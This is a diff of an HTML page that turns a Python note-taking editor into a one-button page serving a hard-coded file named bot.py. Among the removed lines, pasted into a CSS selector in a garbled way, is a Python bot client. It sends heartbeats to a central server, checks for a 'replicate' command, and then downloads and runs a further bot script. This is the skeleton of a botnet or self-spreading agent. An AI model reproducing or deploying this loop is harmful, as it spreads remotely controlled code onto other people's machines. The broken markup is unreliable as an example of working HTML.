@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>My Python Notes</title>
+<title>Download Script</title>
 <style>
   * { box-sizing: border-box; }
   body {
@@ -29,10 +29,11 @@
     color: #94a3b8;
     font-size: 0.95rem;
   }
-  textarea {
+  pre {
     width: 100%;
     height: 400px;
     padding: 16px;
+    margin: 0;
     font-family: "SF Mono", Consolas, Monaco, monospace;
     font-size: 14px;
     line-height: 1.5;
@@ -40,17 +41,16 @@
     color: #e2e8f0;
     border: 1px solid #334155;
     border-radius: 8px;
-    resize: vertical;
-    outline: none;
-  }
-  textarea:focus {
-    border-color: #38bdf8;
+    overflow: auto;
+    white-space: pre;
+    user-select: text;
   }
   .controls {
     margin-top: 16px;
     display: flex;
     gap: 12px;
     flex-wrap: wrap;
+    align-items: center;
   }
   button {
     padding: 10px 20px;
@@ -59,144 +59,62 @@
     border: none;
     border-radius: 6px;
     cursor: pointer;
-    transition: background 0.15s;
-  }
-  #downloadBtn {
     background: #38bdf8;
     color: #0f172a;
+    transition: background 0.15s;
   }
-  #downloadBtn:hover {
+  button:hover {
     background: #7dd3fc;
   }
-  #clearBtn {
-    background: #334155;
-    color: #e2e8f0;
-  }
-  #clearBtn:hover {
-    background: #475569;
-  }
-  input[type="import requests
-import time
-import os
-import subprocess
-
-# Define the central server URL
-CENTRAL_SERVER_URL = '192.168.8.119'
-BOT_SCRIPT_URL = ''
-
-def send_request(command):
-    try:
-        response = requests.post(CENTRAL_SERVER_URL, json={'command': command})
-        return response.json()
-    except requests.exceptions.RequestException as e:
-        print(f"Error sending request: {e}")
-        return None
-
-def download_bot_script():
-    try:
-        response = requests.get(BOT_SCRIPT_URL)
-        with open('bot.py', 'wb') as f:
-            f.write(response.content)
-        return True
-    except requests.exceptions.RequestException as e:
-        print(f"Error downloading bot script: {e}")
-        return False
-
-def install_bot_script():
-    try:
-        subprocess.run(['pip', 'install', 'requests'], check=True)
-        subprocess.run(['python', 'bot.py'], check=True)
-        return True
-    except subprocess.CalledProcessError as e:
-        print(f"Error installing bot script: {e}")
-        return False
-
-def main():
-    while True:
-        # Send a heartbeat to the server
-        send_request('heartbeat')
-        time.sleep(5)
-
-        # Check if the bot script should replicate
-        if 'replicate' in send_request('check_replicate'):
-            if download_bot_script():
-                install_bot_script()
-
-if __name__ == '__main__':
-    main()"] {
-    padding: 10px 12px;
-    background: #1e293b;
-    color: #e2e8f0;
-    border: 1px solid #334155;
-    border-radius: 6px;
-    font-size: 0.95rem;
-    outline: none;
-  }
-  input[type="text"]:focus {
-    border-color: #38bdf8;
+  .filename {
+    font-family: "SF Mono", Consolas, Monaco, monospace;
+    font-size: 0.9rem;
+    color: #94a3b8;
   }
 </style>
 </head>
 <body>
   <div class="container">
-    <h1>Python Notes</h1>
-    <p class="sub">Write anything below, then download it as a .py file.</p>
+    <h1>Download Script</h1>
+    <p class="sub">Click the button to download <span class="filename">script.py</span>.</p>
 
-    <textarea id="codeBox" placeholder="# Write your Python code or notes here...
-def hello():
-    print('Hello, world!')
-
-hello()"></textarea>
+    <pre id="codeView"></pre>
 
     <div class="controls">
-      <input type="text" id="filename" value="my_script" placeholder="filename">
-      <button id="downloadBtn">Download as .py</button>
-      <button id="clearBtn">Clear</button>
+      <button id="downloadBtn">Download script.py</button>
     </div>
   </div>
 
 <script>
-  const codeBox   = document.getElementById('codeBox');
-  const filename  = document.getElementById('filename');
+  // ─────────────────────────────────────────────
+  // HARD-CODED FILE — edit this section only
+  // ─────────────────────────────────────────────
+  const SCRIPT_FILENAME = "bot.py";
+
+  const SCRIPT_CONTENT = `
+`;
+  // ─────────────────────────────────────────────
+  // End of hard-coded file
+  // ─────────────────────────────────────────────
+
+  const codeView    = document.getElementById('codeView');
   const downloadBtn = document.getElementById('downloadBtn');
-  const clearBtn  = document.getElementById('clearBtn');
 
-  // Load any saved text on page open
-  codeBox.value = localStorage.getItem('pyNotes') || '';
-
-  // Save as you type
-  codeBox.addEventListener('input', () => {
-    localStorage.setItem('pyNotes', codeBox.value);
-  });
+  // Display the code (read-only — it's a <pre>, not an editable field)
+  codeView.textContent = SCRIPT_CONTENT;
 
   downloadBtn.addEventListener('click', () => {
-    const text = codeBox.value;
-    if (!text.trim()) {
-      alert('Nothing to download — the text area is empty.');
-      return;
-    }
-
-    let name = (filename.value || 'my_script').trim().replace(/\.py$/i, '');
-    if (!name) name = 'my_script';
-
-    const blob = new Blob([text], { type: 'text/x-python;charset=utf-8' });
+    const blob = new Blob([SCRIPT_CONTENT], { type: 'text/x-python;charset=utf-8' });
     const url  = URL.createObjectURL(blob);
 
     const a = document.createElement('a');
     a.href = url;
-    a.download = name + '.py';
+    a.download = SCRIPT_FILENAME;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
   });
-
-  clearBtn.addEventListener('click', () => {
-    if (confirm('Clear everything?')) {
-      codeBox.value = '';
-      localStorage.removeItem('pyNotes');
-    }
-  });
 </script>
 </body>
-</html> 
+</html>
